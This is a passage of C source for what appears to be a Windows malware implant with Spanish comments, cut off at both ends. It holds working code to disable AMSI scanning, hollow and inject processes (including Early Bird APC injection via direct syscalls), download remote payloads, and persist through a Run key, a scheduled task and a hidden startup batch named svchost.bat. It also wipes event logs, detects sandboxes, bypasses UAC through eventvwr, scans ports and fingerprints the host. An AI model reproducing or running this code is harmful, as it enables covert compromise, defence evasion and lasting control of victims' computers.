    memcpy(buffer, plaintext, ciphertext_len);
    free(plaintext);
    *buffer_len = ciphertext_len;
    
    // Output final
    printf("[D] Plaintext (hex): ");
    for (DWORD i = 0; i < *buffer_len; i++) {
        printf("%02x ", buffer[i]);
    }
    printf("\n[D] Plaintext (str): '");
    for (DWORD i = 0; i < *buffer_len; i++) {
        unsigned char c = buffer[i];
        printf("%c", (c >= 32 && c <= 126) ? c : '.');
    }
    printf("'\n");
    fflush(stdout);
    
    return TRUE;
}

char* GetIPs() {
    printf("[*] getips...\n");
    fflush(stdout);
    char* ips = malloc(1024);
    if (!ips) return NULL; // Verificar malloc
    
    ips[0] = '\0';
    PIP_ADAPTER_INFO adapterInfo = NULL;
    PIP_ADAPTER_INFO adapter = NULL;
    ULONG len = 0;

    GetAdaptersInfo(adapterInfo, &len);
    adapterInfo = (IP_ADAPTER_INFO*)malloc(len);
    if (!adapterInfo) {
        free(ips); // Limpiar si falla
        return NULL;
    }
    
    if (GetAdaptersInfo(adapterInfo, &len) == NO_ERROR) {
        adapter = adapterInfo;
        while (adapter) {
            if (adapter->Type == MIB_IF_TYPE_ETHERNET || adapter->Type == IF_TYPE_PPP) {
                strcat(ips, adapter->IpAddressList.IpAddress.String);
                if (adapter->Next) strcat(ips, ", ");
            }
            adapter = adapter->Next;
        }
    }
    
    free(adapterInfo);
    return ips; // El que llama debe hacer free(ips)
}


char* GetHostname() {
    printf("[*] gethostname...\n");
    fflush(stdout);
    
    char* hostname = malloc(256);
    if (!hostname) return NULL; // Verificar malloc
    
    DWORD size = 256;
    if (!GetComputerNameA(hostname, &size)) {
        free(hostname); // Limpiar si falla GetComputerNameA
        return NULL;
    }
    
    return hostname; // El que llama debe hacer free(hostname)
}

char* GetUsername() {
    printf("[*] getusername...\n");
    fflush(stdout);
    
    char* username = malloc(256);
    if (!username) return NULL; // Verificar malloc
    
    DWORD size = 256;
    if (!GetUserNameA(username, &size)) {
        free(username); // Limpiar si falla GetUserNameA
        return NULL;
    }
    
    return username; // El que llama debe hacer free(username)
}


BOOL patchAMSI(void) {
    printf("[*] amsi...\n");
    fflush(stdout);
    HMODULE amsi_dll = LoadLibraryA("amsi.dll");
    if (amsi_dll == NULL) return FALSE;
    FARPROC scan_buffer_addr = GetProcAddress(amsi_dll, "AmsiScanBuffer");
    if (scan_buffer_addr == NULL) { FreeLibrary(amsi_dll); return FALSE; }
    DWORD old_protect;
    if (!VirtualProtect((LPVOID)scan_buffer_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect)) { FreeLibrary(amsi_dll); return FALSE; }
    char patch[] = { 0xC3 };
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)scan_buffer_addr, patch, sizeof(patch), NULL);
    VirtualProtect((LPVOID)scan_buffer_addr, 1, old_protect, &old_protect);
    FreeLibrary(amsi_dll);
    return TRUE;
}
// ====================================================================
// PE HELPERS (usando winnt.h)
// ====================================================================
PIMAGE_NT_HEADERS get_nt_headers(BYTE* buffer) {
    if (!buffer) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    return (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);  // ← sin *
}

BOOL is_64bit(BYTE* buffer) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(buffer);
    if (!nt) return FALSE;
    return nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

DWORD get_image_size(BYTE* buffer) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(buffer);
    if (!nt) return 0;
    return nt->OptionalHeader.SizeOfImage;
}

DWORD get_entry_point_rva(BYTE* buffer) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(buffer);
    return nt ? nt->OptionalHeader.AddressOfEntryPoint : 0;
}


BYTE* pe_buffer_to_virtual_image(BYTE* raw_buffer, DWORD* out_size) {
    PIMAGE_NT_HEADERS nt = get_nt_headers(raw_buffer);
    if (!nt) return NULL;

    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    BYTE* virtual_image = (BYTE*)VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!virtual_image) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return NULL;
    }

    memcpy(virtual_image, raw_buffer, nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD raw = section[i].PointerToRawData;
        DWORD size = section[i].SizeOfRawData;
        DWORD va = section[i].VirtualAddress;
        if (raw && size) {
            memcpy(virtual_image + va, raw_buffer + raw, size);
        }
    }

    *out_size = image_size;
    return virtual_image;
}
// ====================================================================
// PROCESS MANIPULATION
// ====================================================================

BOOL create_suspended_process(char* path, PROCESS_INFORMATION* pi) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    return CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi);
}


ULONGLONG get_remote_image_base(PROCESS_INFORMATION* pi, BOOL is_32bit_target) {
    ULONGLONG peb_addr = 0;
    SIZE_T read = 0;

    // === 1. Intentar con GetThreadContext ===
#ifdef _WIN64
    if (is_32bit_target) {
        WOW64_CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (Wow64GetThreadContext(pi->hThread, &ctx)) {
            peb_addr = ctx.Ebx;
        }
    } else {
#endif
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (GetThreadContext(pi->hThread, &ctx)) {
#ifdef _WIN64
            peb_addr = ctx.Rdx;
#else
            peb_addr = ctx.Ebx;
#endif
        }
#ifdef _WIN64
    }
#endif

    // Validar y leer ImageBase desde PEB
    if (peb_addr != 0) {
        ULONGLONG image_base = 0;
        ULONGLONG peb_offset = is_32bit_target ? 0x8 : 0x10;  // Offset del ImageBase en el PEB
        if (ReadProcessMemory(pi->hProcess, (LPCVOID)(peb_addr + peb_offset), &image_base, sizeof(ULONGLONG), &read)) {
            if (image_base != 0) {
                printf("[+] Remote image base from PEB (context): 0x%llX\n", image_base);
                return image_base;
            }
        }
    }

    // === 2. Fallback: NtQueryInformationProcess ===
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll handle\n");
        return 0;
    }

    typedef NTSTATUS (WINAPI* NtQueryInformationProcess_t)(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    NtQueryInformationProcess_t NtQueryInformationProcess = 
        (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[-] Failed to get NtQueryInformationProcess\n");
        return 0;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG tmp = 0;
    NTSTATUS status = NtQueryInformationProcess(pi->hProcess, 0, &pbi, sizeof(pbi), &tmp);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtQueryInformationProcess failed: 0x%08X\n", status);
        return 0;
    }

    if (!pbi.PebBaseAddress) {
        printf("[-] PEB Base Address is NULL\n");
        return 0;
    }

    // Leer ImageBaseAddress desde el PEB remoto
    // Offset: 0x10 en x64, 0x8 en x86
    ULONGLONG remote_image_base = 0;
    ULONGLONG peb_image_base_offset = is_32bit_target ? 0x8 : 0x10;

    if (!ReadProcessMemory(pi->hProcess, (PCHAR)pbi.PebBaseAddress + peb_image_base_offset, &remote_image_base, sizeof(remote_image_base), &read)) {
        printf("[-] Failed to read ImageBase from remote PEB\n");
        return 0;
    }

    if (remote_image_base == 0) {
        printf("[-] Remote ImageBase is 0\n");
        return 0;
    }

    printf("[+] Remote image base from NtQueryInformationProcess: 0x%llX\n", remote_image_base);
    return remote_image_base;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION* pi, ULONGLONG entry_point_va, BOOL is_32bit) {
#ifdef _WIN64
    if (is_32bit) {
        WOW64_CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi->hThread, &ctx)) return FALSE;
        ctx.Eax = (DWORD)entry_point_va;
        return Wow64SetThreadContext(pi->hThread, &ctx);
    } else {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!GetThreadContext(pi->hThread, &ctx)) return FALSE;
        ctx.Rcx = entry_point_va;
        return SetThreadContext(pi->hThread, &ctx);
    }
#else
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi->hThread, &ctx)) return FALSE;
    ctx.Eax = (DWORD)entry_point_va;
    return SetThreadContext(pi->hThread, &ctx);
#endif
}

// ====================================================================
// MAIN FUNCTION: overWrite
// ====================================================================
void overWrite(const char* targetPath, const char* payloadPath) {
    printf("[*] Starting migration to: %s\n", targetPath);
   // Verificar si payloadPath es una URL
    if (strncmp(payloadPath, "http", 4) == 0) {
        DWORD fileSize = 0;
        unsigned char* downloaded = DownloadToBuffer(payloadPath, &fileSize);
        if (!downloaded) {
            printf("[-] Failed to download payload\n");
            return;
        }
        
        // Guardar temporalmente
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        strcat(tempPath, "temp_payload.exe");
        
        FILE* fp = fopen(tempPath, "wb");
        if (fp) {
            fwrite(downloaded, 1, fileSize, fp);
            fclose(fp);
            free(downloaded);
            
            // Ahora usar el archivo descargado
            overWrite(targetPath, tempPath);
            DeleteFileA(tempPath);
            return;
        }
    }
    // === 1. Cargar payload ===
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open payload: %s\n", payloadPath);
        return;
    }

    DWORD rawSize = GetFileSize(hFile, NULL);
    BYTE* rawBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, rawSize);
    DWORD read = 0;
    ReadFile(hFile, rawBuffer, rawSize, &read, NULL);
    CloseHandle(hFile);

    if (read != rawSize) {
        printf("[-] Failed to read payload\n");
        HeapFree(GetProcessHeap(), 0, rawBuffer);
        return;
    }

    DWORD payloadImageSize = 0;
    BYTE* payloadImage = pe_buffer_to_virtual_image(rawBuffer, &payloadImageSize);
    HeapFree(GetProcessHeap(), 0, rawBuffer);

    if (!payloadImage) {
        printf("[-] Failed to map payload\n");
        return;
    }
    printf("[+] Payload mapped: %lu bytes\n", payloadImageSize);

    // === 2. Crear proceso suspendido ===
    PROCESS_INFORMATION pi = {0};
    if (!create_suspended_process((char*)targetPath, &pi)) {
        VirtualFree(payloadImage, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Suspended process created: PID %lu\n", pi.dwProcessId);

    // === 3. Reservar 2 MB en el proceso remoto ===
    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, 0x200000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        VirtualFree(payloadImage, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Allocated 2 MB in remote process: %p\n", remoteBuffer);

    // === 4. Escribir payload completo ===
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        VirtualFree(payloadImage, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Wrote %zu bytes to remote process\n", written);

    // === 5. Actualizar contexto del hilo para apuntar al nuevo entry point ===
    BOOL isPayload64 = is_64bit(payloadImage);
    ULONGLONG entryPointVA = (ULONGLONG)remoteBuffer + get_entry_point_rva(payloadImage);

    if (!update_remote_entry_point(&pi, entryPointVA, !isPayload64)) {
        printf("[-] Failed to update remote entry point\n");
        TerminateProcess(pi.hProcess, 1);
    } else {
        ResumeThread(pi.hThread);
        printf("[+] Migration successful. Process resumed.\n");
    }

    // === 6. Cleanup ===
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    VirtualFree(payloadImage, 0, MEM_RELEASE);
}
// Limpia el historial de comandos de la consola actual
void cleanSystemLogs() {
    printf("[*] Attempting to clean system logs and artifacts...\n");
    fflush(stdout);
    // 1. Limpiar historial de cmd.exe (doskey)
    system("doskey /reinstall");

    // 2. Borrar archivos temporales comunes
    system("del /f /q %TEMP%\\\beacon_temp_* 2>nul");
    system("del /f /q %TEMP%\\\*.tmp 2>nul");

    // 4. Limpiar el historial de comandos de la consola (cmd.exe)
    HANDLE hConOut = CreateFileA("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hConOut != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteConsoleA(hConOut, "\x1b[2J\x1b[H", 7, &written, NULL); // ANSI clear screen
        CloseHandle(hConOut);
    }

    // 5. Intentar borrar eventos del registro (requiere SeSecurityPrivilege)
    // Nota: Esto generalmente requiere privilegios elevados y puede fallar.
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp = {0};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (LookupPrivilegeValueA(NULL, "SeSecurityPrivilege", &tp.Privileges[0].Luid)) {
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        CloseHandle(hToken);
    }

    system("powershell -nop -c \\"Clear-EventLog -LogName Application,Security,System -ErrorAction SilentlyContinue\\"");

    printf("[+] System cleanup attempt completed.\n");
}

// ensurePersistence.c
BOOL ensurePersistence() {
    printf("[*] Setting up persistence...\n");
    fflush(stdout);

    char executable[MAX_PATH];
    if (!GetModuleFileNameA(NULL, executable, MAX_PATH)) {
        return FALSE;
    }

    // Método 1: Registro de inicio (HKCU) - Seguro y común
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

        if (RegSetValueExA(hKey, "SystemMaintenance", 0, REG_SZ,
                           (BYTE*)executable, strlen(executable) + 1) == ERROR_SUCCESS) {
            printf("[+] Added to registry Run key\n");
        } else {
            printf("[-] Failed to set registry value\n");
        }
        RegCloseKey(hKey);
    }

    // Método 2: Tarea programada como usuario actual (sin SYSTEM)
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \\"SystemMaintenanceTask\\" /tr \\"%s\\" /sc onlogon /rl HIGHEST /f >nul 2>&1",
        executable);

    int result = system(cmd);
    if (result == 0) {
        printf("[+] Scheduled task created (user context)\n");
    } else {
        printf("[-] Scheduled task creation failed (likely no permissions)\n");
    }

    // Método 3: Archivo oculto en Startup con nombre legítimo
    char startupPath[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\svchost.bat",
                             startupPath, sizeof(startupPath));

    FILE* f = fopen(startupPath, "w");
    if (f) {
        // Usa atributos ocultos y ejecución silenciosa
        fprintf(f, "@echo off\nif not exist \\"%s\\" exit\n", executable);
        fprintf(f, "start \\"\\" /min \\"%s\\" >nul 2>&1\n", executable);
        fclose(f);

        // Hacer archivo oculto
        SetFileAttributesA(startupPath, FILE_ATTRIBUTE_HIDDEN);
        printf("[+] Added hidden batch to startup folder\n");
    } else {
        printf("[-] Failed to write startup batch\n");
    }

    return TRUE;
}


// isSandboxEnvironment.c
BOOL isSandboxEnvironment() {
    printf("[*] issandobox...\n");
    fflush(stdout);
    // 1. Número de CPUs
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 1) {
        return TRUE;
    }

    // 2. Memoria RAM < 6 GB
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        if (memInfo.ullTotalPhys < 6ULL * 1024 * 1024 * 1024) {
            return TRUE;
        }
    }

    // 3. MAC Address de VM
    PIP_ADAPTER_INFO adapterInfo = NULL;
    PIP_ADAPTER_INFO adapter = NULL;
    ULONG len = 0;
    GetAdaptersInfo(adapterInfo, &len);
    adapterInfo = (IP_ADAPTER_INFO*)malloc(len);
    if (GetAdaptersInfo(adapterInfo, &len) == NO_ERROR) {
        adapter = adapterInfo;
        while (adapter) {
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X",
                adapter->Address[0], adapter->Address[1], adapter->Address[2]);

            if (strcmp(mac_str, "00:05:69") == 0 || // VMware
                strcmp(mac_str, "00:0C:29") == 0 || // VMware
                strcmp(mac_str, "00:50:56") == 0 || // VMware
                strcmp(mac_str, "08:00:27") == 0 || // VirtualBox
                strcmp(mac_str, "52:54:00") == 0) { // QEMU/KVM
                free(adapterInfo);
                return TRUE;
            }
            adapter = adapter->Next;
        }
    }
    if (adapterInfo) free(adapterInfo);

    // 4. Dispositivos de disco virtual
    if (GetDriveTypeA("C:\\\\") == DRIVE_FIXED) {
        HANDLE h = CreateFileA("\\\\\\\\.\\\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            STORAGE_PROPERTY_QUERY query = { StorageDeviceProperty };
            STORAGE_DEVICE_DESCRIPTOR descriptor;
            DWORD size;
            if (DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), &descriptor, sizeof(descriptor), &size, NULL)) {
                char vendor[256] = {0};
                if (descriptor.VendorIdOffset) {
                    strcpy(vendor, (char*)&((BYTE*)&descriptor)[descriptor.VendorIdOffset]);
                    strlwr(vendor);
                    if (strstr(vendor, "vmware") || strstr(vendor, "virtual") || strstr(vendor, "qemu")) {
                        CloseHandle(h);
                        return TRUE;
                    }
                }
            }
            CloseHandle(h);
        }
    }

    return FALSE;
}

void tryPrivilegeEscalation() {
    printf("[*] Privilege escalation not implemented.\n");
    fflush(stdout);
}

BOOL executeUACBypass(const char* payloadPath) {
    printf("[*] Attempting UAC bypass via eventvwr.exe...\n");
    fflush(stdout);
    // Ruta del payload
    char fullPayloadPath[MAX_PATH];
    if (!GetFullPathNameA(payloadPath, MAX_PATH, fullPayloadPath, NULL)) {
        printf("[-] Failed to get full path of payload.\n");
        return FALSE;
    }

    // Claves del registro
    const char* regKey = "Environment";
    const char* regValue = "windir";
    const char* maliciousCmd = "\\\\??\\\\C:\\\\Windows\\\\System32\\\\cmd.exe /k %windir%";

    // Escribir en HKCU\Environment\windir
    HKEY hKey;
    if (RegOpenKeyA(HKEY_CURRENT_USER, regKey, &hKey) != ERROR_SUCCESS) {
        printf("[-] Failed to open HKCU\\\\Environment.\n");
        return FALSE;
    }

    if (RegSetValueExA(hKey, regValue, 0, REG_SZ, (BYTE*)fullPayloadPath, strlen(fullPayloadPath)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        printf("[-] Failed to set registry value.\n");
        return FALSE;
    }
    RegCloseKey(hKey);

    // Ejecutar eventvwr.exe (se auto-eleva si el usuario es admin)
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas";
    sei.lpFile = "eventvwr.exe";
    sei.nShow = SW_HIDE;

    if (!ShellExecuteExA(&sei)) {
        printf("[-] Failed to execute eventvwr.exe.\n");
        return FALSE;
    }

    // Esperar un poco
    Sleep(2000);

    // Limpiar
    RegOpenKeyA(HKEY_CURRENT_USER, regKey, &hKey);
    RegDeleteValueA(hKey, regValue);
    RegCloseKey(hKey);

    printf("[+] UAC bypass attempt completed.\n");
    return TRUE;
}
void scanPort(void* arg) {
    PortResult* result = (PortResult*)arg;

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // If startup fails, return.
        return;
    }

    // Create a socket
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Set up the target address
    SOCKADDR_IN sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(result->port);
    inet_pton(AF_INET, result->ip, &sa.sin_addr);

    // Attempt to connect with a 1-second timeout
    unsigned long blocking_mode = 1; // 1 for non-blocking
    ioctlsocket(s, FIONBIO, &blocking_mode);
    connect(s, (SOCKADDR*)&sa, sizeof(sa));

    // Check socket status for 1 second
    fd_set write_set;
    FD_ZERO(&write_set);
    FD_SET(s, &write_set);
    TIMEVAL timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    if (select(0, NULL, &write_set, NULL, &timeout) > 0) {
        int so_error;
        int len = sizeof(so_error);
        getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&so_error, &len);
        if (so_error == 0) {
            // Connection successful
            result->open = TRUE;
        }
    }

    // Clean up
    closesocket(s);
    WSACleanup();
}
// PortScanner.c
void PortScanner(char* targetIP, int* ports, int numPorts) {
    printf("[*] Scanning ports on %s...\n", targetIP);
    fflush(stdout);
    
    HANDLE hThreads[64];
    PortResult results[64];
    int threadCount = 0;
    
    // Limpiar resultados anteriores
    if (portScanResults) {
        free(portScanResults);
    }
    portScanResults = (char*)malloc(4096);
    if (!portScanResults) return;
    portScanResults[0] = '\0';
    
    // Crear threads para cada puerto
    for (int i = 0; i < numPorts && i < 64; i++) {
        strcpy(results[threadCount].ip, targetIP);
        results[threadCount].port = ports[i];
        results[threadCount].open = FALSE;
        
        hThreads[threadCount] = (HANDLE)_beginthread(scanPort, 0, &results[threadCount]);
        if (hThreads[threadCount] != (HANDLE)-1) {
            threadCount++;
        }
    }
    
    // Esperar a que todos los threads terminen
    WaitForMultipleObjects(threadCount, hThreads, TRUE, 5000);
    
    // Recopilar resultados
    for (int i = 0; i < threadCount; i++) {
        if (results[i].open) {
            char temp[64];
            snprintf(temp, sizeof(temp), "%s:%d", results[i].ip, results[i].port);
            if (strlen(portScanResults) > 0) strcat(portScanResults, ",");
            strcat(portScanResults, temp);
            printf("[+] Port %d open on %s\n", results[i].port, results[i].ip);
        }
    }
    
    printf("[*] Scan completed. Open ports: %s\n", portScanResults);
}

void PortScannerWrapper(void* arg) {
    PortScannerArgs* args = (PortScannerArgs*)arg;
    
    // Hacer copia local porque el argumento puede desaparecer
    char ip[32];
    int ports[64];
    int numPorts = args->numPorts;
    strcpy(ip, args->targetIP);
    memcpy(ports, args->ports, numPorts * sizeof(int));
    
    free(args); // fue malloc'ed antes de _beginthread

    // Ahora llamar a la función real
    PortScanner(ip, ports, numPorts);
}

// =================================================================================================
// Early Bird APC Injection
// =================================================================================================



// === INYECCIÓN EARLY BIRD + SYSCALL ===
BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
    if (anti_analysis()) {
        printf("[-] Entorno de análisis detectado. Saliendo.\n");
        fflush(stdout);
        return FALSE;
    }
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);

    printf("[*] Intentando crear proceso: %s\n", OBF_TARGET_PROCESS);
    fflush(stdout);

    if (!CreateProcessA(
        (char*)OBF_TARGET_PROCESS,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        DWORD err = GetLastError();
        printf("[-] CreateProcessA falló para %s: %lu\n", OBF_TARGET_PROCESS, err);
        fflush(stdout);

        return FALSE;
    }

    printf("[+] Proceso suspendido creado: PID=%lu\n", pi.dwProcessId);
    fflush(stdout);

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    HMODULE ntdll = GetNtdllBase();
    if (!ntdll) {
        printf("[-] No se pudo obtener ntdll.dll\n");
        fflush(stdout);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    PVOID pNtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    PVOID pNtWriteVirtualMemory   = GetProcAddress(ntdll, "NtWriteVirtualMemory");
    PVOID pNtQueueApcThread       = GetProcAddress(ntdll, "NtQueueApcThread");
    PVOID pNtResumeThread         = GetProcAddress(ntdll, "NtResumeThread");

    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtQueueApcThread || !pNtResumeThread) {
        printf("[-] No se pudieron obtener funciones de ntdll\n");
        fflush(stdout);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    DWORD ssn_alloc = GetSyscallNumber(pNtAllocateVirtualMemory);
    DWORD ssn_write = GetSyscallNumber(pNtWriteVirtualMemory);
    DWORD ssn_apc   = GetSyscallNumber(pNtQueueApcThread);
    DWORD ssn_resume = GetSyscallNumber(pNtResumeThread);

    if (!ssn_alloc || !ssn_write || !ssn_apc || !ssn_resume) {
        printf("[-] No se pudo obtener SSN de alguna función\n");
        fflush(stdout);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    SIZE_T size = (shellcode_len + 4095) & ~4095;
    LPVOID pRemoteMem = NULL;

    // 🔹 NtAllocateVirtualMemory (syscall)
    HellsGate(ssn_alloc);
    NTSTATUS status = HellDescent(
        (DWORD64)hProcess,
        (DWORD64)&pRemoteMem,
        0,
        (DWORD64)&size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtAllocateVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
    fflush(stdout);
    Sleep(GetJitteredSleep(SLEEP_BASE));
    // 🔹 WriteProcessMemory (API normal, más estable que NtWriteVirtualMemory syscall)
    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
        printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
        fflush(stdout);

        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] Shellcode escrito en proceso remoto.\n");
    fflush(stdout);

    // 🔹 VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
    ULONG oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
    fflush(stdout);

    // 🔹 NtQueueApcThread (syscall)
    HellsGate(ssn_apc);
    status = HellDescent(
        (DWORD64)hThread,
        (DWORD64)pRemoteMem,
        0, 0, 0, 0
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtQueueApcThread falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] APC enqueued via NtQueueApcThread.\n");
    fflush(stdout);

    // 🔹 NtResumeThread (syscall)
    DWORD suspendCount;
    HellsGate(ssn_resume);
    status = HellDescent(
        (DWORD64)hThread,
        (DWORD64)&suspendCount,
        0, 0, 0, 0
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Hilo reanudado. Payload en ejecución.\n");
    fflush(stdout);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}


PacketEncryptionContext* init_aes_context(const char* key_hex) {
    printf("[*] packetencryptioncontext...\n");
    fflush(stdout);
    PacketEncryptionContext* ctx = (PacketEncryptionContext*)malloc(sizeof(PacketEncryptionContext));
    if (!ctx) return NULL;

    // Convertir hex a bytes
    for (int i = 0; i < 64; i += 2) {
        char byte_str[3] = { key_hex[i], key_hex[i+1], '\0' };
        ctx->Key[i/2] = (uint8_t)strtol(byte_str, NULL, 16);
    }

    ctx->Valid = 1;
    ctx->Enabled = 1;
    return ctx;
}

// retry_http_request.c
char* retry_http_request(const char* url, const char* method, const char* data, int max_retries) {
    printf("[*] retry_http_request...\n");
    fflush(stdout);
    printf("[*] Enviando %s a: %s\n", method, url);
    if (data) {
        printf("[*] Datos a enviar (encriptados): %s\n", data);
    }
    fflush(stdout);
    
    for (int attempt = 0; attempt < max_retries; attempt++) {
        printf("[*] Intento %d/%d\n", attempt + 1, max_retries);
        fflush(stdout);
        
        HINTERNET hSession = WinHttpOpen(USER_AGENT,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
